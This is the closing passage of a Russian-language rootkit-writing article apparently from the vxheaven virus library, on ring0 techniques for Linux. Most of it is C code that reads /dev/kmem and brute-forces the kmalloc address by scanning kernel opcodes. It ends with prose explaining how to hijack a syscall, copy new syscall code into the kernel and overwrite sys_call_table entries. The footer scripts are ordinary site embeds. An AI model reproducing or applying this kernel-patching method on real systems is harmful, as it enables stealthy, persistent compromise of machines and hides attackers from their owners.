&nbsp; &nbsp; <span style="color: #993333;">struct</span> <span style="color: black;">&#123;</span> uint a<span style="color: #339933;">,</span> f<span style="color: #339933;">,</span> cnt<span style="color: #339933;">;</span> <span style="color: black;">&#125;</span> rtab<span style="color: black;">&#91;</span>RNUM<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #339933;">*</span>t<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">int</span>&nbsp; &nbsp; &nbsp; &nbsp; i<span style="color: #339933;">,</span> a<span style="color: #339933;">,</span> j<span style="color: #339933;">,</span> push1<span style="color: #339933;">,</span> push2<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">int</span>&nbsp; &nbsp; &nbsp; &nbsp; found <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">,</span> total <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> &nbsp; &nbsp; &nbsp; buf<span style="color: black;">&#91;</span><span style="color: #208080;">0x10010</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> kcache<span style="color: black;">&#91;</span><span style="color: #0000dd;">10</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #339933;">*</span>p<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> &nbsp; &nbsp; &nbsp; ret<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> &nbsp; &nbsp; &nbsp; gfp<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> &nbsp;eax<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> &nbsp;cnt &nbsp;<span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; <span style="color: black; font-style: italic;">// get kernel symbol directly via get_kernel_syms</span><br/>
&nbsp; &nbsp; ret <span style="color: #339933;">=</span> get_sym<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;kmalloc&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>ret<span style="color: black;">&#41;</span> <span style="color: #b1b100;">return</span> ret<span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; <span style="color: black; font-style: italic;">// determine GFP_KERNEL value, varying on kernel version</span><br/>
&nbsp; &nbsp; gfp <span style="color: #339933;">=</span> get_gfp<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; <span style="color: black; font-style: italic;">// try to bruteforce kmalloc address ;)</span><br/>
&nbsp; &nbsp; <span style="color: #b1b100;">for</span><span style="color: black;">&#40;</span>i<span style="color: #339933;">=</span><span style="color: black;">&#40;</span>pgoff<span style="color: #339933;">+</span><span style="color: #208080;">0x100000</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>i<span style="color: #339933;">&lt;</span><span style="color: black;">&#40;</span>pgoff<span style="color: #339933;">+</span><span style="color: #208080;">0x1000000</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>i<span style="color: #339933;">+=</span><span style="color: #208080;">0x10000</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// read data from kernel memory</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #339933;">!</span>readkmem<span style="color: black;">&#40;</span>kmem<span style="color: #339933;">,</span> buf<span style="color: #339933;">,</span> i<span style="color: #339933;">,</span> <span style="color: #993333;">sizeof</span><span style="color: black;">&#40;</span>buf<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// look for mov GFP_KERNEL, edx and call</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span><span style="color: black;">&#40;</span>p<span style="color: #339933;">=</span>buf<span style="color: #339933;">;</span>p<span style="color: #339933;">&amp;</span>lt<span style="color: #339933;">;</span>buf<span style="color: #339933;">+</span><span style="color: #208080;">0x10000</span><span style="color: #339933;">;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// look at opcode</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">switch</span> <span style="color: black;">&#40;</span><span style="color: #339933;">*</span>p<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">case</span> <span style="color: #208080;">0xa1</span><span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// probably, mov to eax</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// so let's store eax value to variable</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// kmalloc probably does not take very big args</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; eax <span style="color: #339933;">=</span> <span style="color: #339933;">*</span><span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span>p<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">continue</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">case</span> <span style="color: #208080;">0xba</span><span style="color: #339933;">:</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// mov found, check for GFP_KERNEL</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span><span style="color: #339933;">!</span>memmem<span style="color: black;">&#40;</span>p<span style="color: #339933;">,</span> <span style="color: #0000dd;">4</span><span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>gfp<span style="color: #339933;">,</span> <span style="color: #0000dd;">4</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #b1b100;">continue</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push1 <span style="color: #339933;">=</span> <span style="color: #339933;">*</span><span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span>p<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; p <span style="color: #339933;">+=</span> <span style="color: #0000dd;">4</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">continue</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">case</span> <span style="color: #208080;">0xe8</span><span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// call found, if mov was saved then break</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>push1<span style="color: black;">&#41;</span> <span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">default</span><span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// some other shit</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span>push1 <span style="color: #339933;">&amp;&amp;</span> cnt <span style="color: #339933;">&lt;</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cnt<span style="color: #339933;">++;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">continue</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span> cnt <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push1 <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">continue</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// we have mov and call instructions, let's get address</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// and check if it is in kernel code section</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; a <span style="color: #339933;">=</span> <span style="color: #339933;">*</span><span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span> <span style="color: #339933;">*</span><span style="color: black;">&#41;</span> p <span style="color: #339933;">+</span> i <span style="color: #339933;">+</span> <span style="color: black;">&#40;</span>p <span style="color: #339933;">-</span> buf<span style="color: black;">&#41;</span> <span style="color: #339933;">+</span> <span style="color: #0000dd;">4</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>a <span style="color: #339933;">&amp;</span> <span style="color: #208080;">0xF0000000</span><span style="color: black;">&#41;</span> <span style="color: #339933;">!=</span> pgoff<span style="color: black;">&#41;</span> <span style="color: #b1b100;">continue</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// kmem_page_alloc test</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// very very bad and platform-dependent</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span>readkmem<span style="color: black;">&#40;</span>kmem<span style="color: #339933;">,</span> kcache<span style="color: #339933;">,</span> a<span style="color: #339933;">,</span> <span style="color: #0000dd;">4</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">&#40;</span>memmem<span style="color: black;">&#40;</span>kcache<span style="color: #339933;">,</span> <span style="color: #0000dd;">4</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">&quot;<span style="color: #660099; font-weight: bold;">\x57</span><span style="color: #660099; font-weight: bold;">\xf6</span><span style="color: #660099; font-weight: bold;">\xc2</span><span style="color: #660099; font-weight: bold;">\x10</span>&quot;</span><span style="color: #339933;">,</span> <span style="color: #0000dd;">4</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #b1b100;">continue</span><span style="color: #339933;">;</span><br/>
<br/>
<span style="color: #339933;">#ifdef DEBUG&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/*printf(&quot;%x %0.2x %0.2x %0.2x %0.2x eax=0x%x\n&quot;,<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;i+(p-buf), <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;((unsigned char*)&amp;a)[0], <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;((unsigned char*)&amp;a)[1], <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;((unsigned char*)&amp;a)[2], <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;((unsigned char*)&amp;a)[3], <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;eax);*/</span><br/>
<span style="color: #339933;">#endif</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; p <span style="color: #339933;">+=</span> <span style="color: #0000dd;">4</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; total<span style="color: #339933;">++;</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// find address in table</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>j <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">,</span> t <span style="color: #339933;">=</span> rtab<span style="color: #339933;">;</span> j <span style="color: #339933;">&lt;</span> found<span style="color: #339933;">;</span> j<span style="color: #339933;">++,</span> t<span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>t<span style="color: #339933;">-&gt;</span>a <span style="color: #339933;">==</span> a <span style="color: #339933;">&amp;&amp;</span> t<span style="color: #339933;">-&gt;</span>f <span style="color: #339933;">==</span> push1<span style="color: black;">&#41;</span> <span style="color: #000000; font-weight: bold;">break</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>j <span style="color: #339933;">&lt;</span> found<span style="color: black;">&#41;</span> t<span style="color: #339933;">-&gt;</span>cnt<span style="color: #339933;">++;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span> <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>found <span style="color: #339933;">&gt;=</span> RNUM<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">else</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; found<span style="color: #339933;">++;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; t<span style="color: #339933;">-&gt;</span>a <span style="color: #339933;">=</span> a<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; t<span style="color: #339933;">-&gt;</span>f <span style="color: #339933;">=</span> push1<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; t<span style="color: #339933;">-&gt;</span>cnt <span style="color: #339933;">=</span> <span style="color: #0000dd;">1</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push1 <span style="color: #339933;">=</span> push2 <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span> <br/>
&nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<br/>
&nbsp; &nbsp; t <span style="color: #339933;">=</span> NULL<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; <span style="color: black; font-style: italic;">// find function called maximum number of times</span><br/>
&nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>j <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span>j <span style="color: #339933;">&lt;</span> found<span style="color: #339933;">;</span> j<span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: #339933;">!</span>t <span style="color: #339933;">||</span> rtab<span style="color: black;">&#91;</span>j<span style="color: black;">&#93;</span>.<span style="color: #202020;">cnt</span> <span style="color: #339933;">&gt;</span> t<span style="color: #339933;">-&gt;</span>cnt<span style="color: black;">&#41;</span> t <span style="color: #339933;">=</span> rtab<span style="color: #339933;">+</span>j<span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>t<span style="color: black;">&#41;</span> <span style="color: #b1b100;">return</span> t<span style="color: #339933;">-&gt;</span>a<span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span><br/>
<span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<p>При использовании этого кода следует учитывать, что значение GFP_KERNEL различно в разных версиях ядра.</p>
<p>После определения адресов можно временно заменить какой-либо системный вызов (например, olduname()) своим кодом с прошитым в нем адресом kmalloc для выделения необходимой памяти, в которую впоследствии будет скопирован код новых системных вызовов. После успешного выполнения этой процедуры и копирования кода новых системных вызовов в ядро производится подмена значений в sys_call_table в соответствии со стандартным алгоритмом.</p>
<h2><a name="c8"></a>Резюме</h2>
<p>В этой статье рассмотрены основные технологии, применяемые в современных ring3 и ring0 руткитах для Linux. Некоторые методы остались за пределами статьи: например, патчинг VFS и смена обработчика прерываний - о них будет рассказано в следующей статье.</p>
<h2><a name="c9"></a>Список литературы</h2>
<ol>
<li>dev0id, <a href="http://www.securitylab.ru/contest/212111.php">"Защита от исполнения в стеке (ОС Линукс)"</a></li>
<li>Phrack #58, <a href="http://www.phrack.org/issues.html?issue=58&amp;id=7#article">"Linux on-the-fly kernel patching without LKM"</a></li>
</ol>
[<a style="" href="/lib/?lang=RU&amp;index=RK#vdp00">Вернуться к списку</a>] [<a href="/lib/vdp00.html#disqus_thread">Комментарии</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vdp00">de</a><a href="/lib/index.php?lang=en&amp;id=vdp00">en</a><a href="/lib/index.php?lang=es&amp;id=vdp00">es</a><a href="/lib/index.php?lang=it&amp;id=vdp00">it</a><a href="/lib/index.php?lang=fr&amp;id=vdp00">fr</a><a href="/lib/index.php?lang=pl&amp;id=vdp00">pl</a><a href="/lib/index.php?lang=ru&amp;id=vdp00">ru</a><a href="/lib/index.php?lang=ua&amp;id=vdp00">ua</a></div>
</body>
</html>
